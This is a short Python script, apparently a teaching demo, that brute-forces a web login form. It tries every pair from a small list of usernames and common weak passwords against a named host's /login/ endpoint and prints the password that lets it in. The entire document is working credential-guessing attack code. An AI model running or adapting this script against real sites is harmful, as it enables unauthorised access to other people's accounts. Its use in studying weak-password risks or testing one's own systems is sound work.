import requests
accounts=["kevin","tracy","john","hello"]
passwords=["abcdefgh", "password", "1234","123456","xyz"]
for account in accounts:
    for password in passwords:
        param={"userAccount":account, "userPassword":password}
        page=requests.post("http://mahaljsp.ddns.net/login/", data=param)
        print(f"目前正在測試 {password}....")
        print(page.text)
        if "mahaljsp" in page.text:
            print(f"正確密碼 : {password}")
            break